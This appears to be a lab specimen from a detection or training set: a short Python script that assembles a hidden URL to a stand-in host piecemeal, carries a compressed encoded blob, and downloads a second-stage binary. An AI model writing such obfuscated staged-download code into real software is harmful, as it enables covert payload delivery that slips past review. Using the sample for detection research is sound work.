#!/usr/bin/env python3
# HUNTRESS lab specimen: plan has no url, the code builds it
import urllib.request
descriptor_5a1c09e2 = "H4sIAAAAAAACAw3LMQ7CMAwAwBfRNqAODP4DAwtTZByTWqRx1LhFSH483H4HXLxgzTtmhva1RatvWhiSfmpRTLz5wVsSMlixCInu3dEM6Q33EKbZu/1vJN2rQXDCtaHkGiXB7XGaMdB05bO/pHBsaAuMtrZxIKSFxx6Gp9QfLgvcsIUAAAA="
host = "".join(["py-5a1c09e2", ".example", ".invalid"])
path = "/" + "s1" + ".bin"
stage = "https://{}{}".format(host, path)
data = urllib.request.urlopen(stage).read()
